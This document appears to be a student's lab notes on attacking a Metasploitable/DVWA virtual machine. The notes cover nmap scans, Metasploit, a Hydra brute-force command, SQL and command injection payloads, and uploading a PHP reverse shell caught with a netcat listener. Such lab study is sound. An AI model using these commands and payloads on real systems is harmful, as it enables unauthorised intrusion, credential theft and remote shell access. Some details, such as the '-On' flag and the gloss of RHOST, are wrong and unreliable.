@@ -1,0 +1,193 @@
+->To get Metasploitable IP (192.168.126.129): ifconfig
+
+->In bash, to define a variable, use export
+
+->oN is used to represent output
+
+->nmap for network mapping, to retrieve outside ports, that is, of a different server/machine
+
+->-sC for scripts, that gives all the miscellaneous information about the services running on different ports
+
+->-sV for version of the services running on diferent ports
+
+->Network Mapping: nmap -On scan_name $IPADDRESS 
+
+->To map a particular port: nmap -oN scan_name -pPortNumber -sV -sC $IPADDRESS
+
+->Ctrl+Shift+V: Paste (In Terminal)
+->Ctrl+Shift+C: Copy (In Terminal)
+
+
+
+
+
+->FTP information: -
+
+┌──(kali㉿kali)-[~]
+└─$ nmap -oN first_scan -p21 -sV -sC $IP 
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 19:07 IST
+Nmap scan report for 192.168.126.129
+Host is up (0.0021s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 192.168.126.130
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds
+
+->msfconsole: To start metasploit in Kali
+
+(->banner: To print banners. For fun:) )
+
+->cat first_scan: to check the contents of the first_scan, to get the version
+
+->nmap -oN first_scan -p- $IP: for all ports, including uncommon ports
+
+->(less: bascially a text reader)
+
+(->gzip zip_name.tar.gz -d: To unzip the zip_name file)
+
+->In msfconsole: -
+
+o search version
+o use exploit_name
+o info: to get info of active exploit
+o (RHOST: right side host (METASPLOITABLE) )
+o exploit OR run: to run exploit after setting RHOST
+o python -c "import pty; pty.spawn('/bin/bash');": To get an interactive shell
+
+
+
+
+->HTTP Information: -
+
+┌──(kali㉿kali)-[~]
+└─$ nmap -oN port80 -sV -sC -p80 $IP 
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 19:48 IST
+Nmap scan report for 192.168.126.129
+Host is up (0.0026s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+|_http-title: Metasploitable2 - Linux
+|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.30 seconds
+
+->Could not exploit HTTP: Because Metaspoitables's website is being hosted there, hence not meant for attacks
+
+
+
+
+
+->MySQL Information: -
+
+┌──(kali㉿kali)-[~]
+└─$ nmap -oN portmysql3306 -sV -sC -p3306 $IP
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 20:01 IST
+Nmap scan report for 192.168.126.129
+Host is up (0.0013s latency).
+
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.0.51a-3ubuntu5
+|   Thread ID: 31
+|   Capabilities flags: 43564
+|   Some Capabilities: Support41Auth, SupportsCompression, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, ConnectWithDatabase, SupportsTransactions, LongColumnFlag
+|   Status: Autocommit
+|_  Salt: _K;'O:tYAvQpc|fllWN`
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds
+
+->Could not exploit MySQL
+
+
+
+->DVWA: -
+
+>Run the Metasploitable's IP on the web browser of Kali
+>We'll get the website that IP is hosting
+>Select DVWA from the given list of options
+
+
+
+->Password Brute Forcing: -
+
+->Using Hydra
+
+->Extract word list, present previously in Kali
+(->In documents 
+->cd usr/share/wordlists
+->sudo gzip rockyou.txt.gz -d)
+
+->POST is safer than GET as in GET, in the URL itself you'll be able to see the Id and the Password entered, however in the POST form, the Id and password are not visible as such
+->In order to view the Id and Password, inspect the page, and go to the networks tab. There, after a request has been sent, select that request and go to the requests tab to view the usernmae(Id) and password
+
+->Use the IP address in Kali's browser to access the site being hosted by Metasploitable
+
+->Go to DVWA's login page
+
+->Command for password cracking (to be given in Kali's Terminal): sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+->Will work without sudo as well, but if permission denied, use sudo
+
+o -l: For username, which we know is admin, so we use as such
+o -P: For password list
+o (-p: For single password)
+o /usr/share/wordlists/rockyou.txt: Lists of passwords (available in Kali)
+o http-post-form type request
+o /dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed : site address, after the IP address. WE write ^USER^ and ^PASS^ to allow hydra to fill in those spaces. The Login= part tells that the password is incorrect on the specified error message.
+
+->Executing this will generate the Id and password, use it to enter the login
+
+
+
+
+->SQL Injection: -
+
+->Go to DVWA->DVWA Security->Security:Low
+->SQL Injection
+->Command to enter: ' or 1=1#
+->This will basically do: select* from table_name where always true(' or 1=1#);
+
+
+
+->Command Injection: -
+
+->Go to DVWA->DVWA Security->Security:Low
+->Command injection
+->Use ; before any command to get command line output. The ; is the command execution tool that provides us the backdoor to the Metasploitable's terminal
+->;ls
+
+
+
+->Malware Uploading(Reverse Shell): -
+
+->Search for pentestmonkey.php file(Malware File), and copy that code in Kali after changing the port address and the IP address and save it
+->(Port Address: Where you I want to receive the shell; IP Address: Of Kali, that is receiving machine)
+->Include that file in the DVWA->File upload section
+->It will generate a path of where the file is stored in Metasploitable
+->Copy that path and paste it in the browser after removing the #
+->nc -lnvp 1334: Command to run netcat, in order to build connection to the Metasploitable's shell
+->(l: listen; v: verbose(To print everything possible); n:number(that I am giving the port number directly) ;p: port number
+
+
+
+                                                                                                                                                                                                                                       
